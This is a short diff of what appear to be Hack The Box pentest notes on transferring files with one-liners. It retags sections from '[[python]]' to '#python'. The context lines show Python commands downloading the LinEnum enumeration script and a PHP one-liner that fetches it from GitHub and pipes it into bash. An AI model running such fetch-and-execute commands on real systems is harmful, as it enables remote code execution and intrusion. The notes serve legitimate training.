@@ -8,7 +8,7 @@ h@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.github
 ```shell
 h@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
-[[python]]
+#python
 
 #### PHP
 ```shell
@@ -23,7 +23,7 @@ fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", 
 ```shell
 h@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
-[[php]]
+#php
 
 #### Ruby
 ```shell
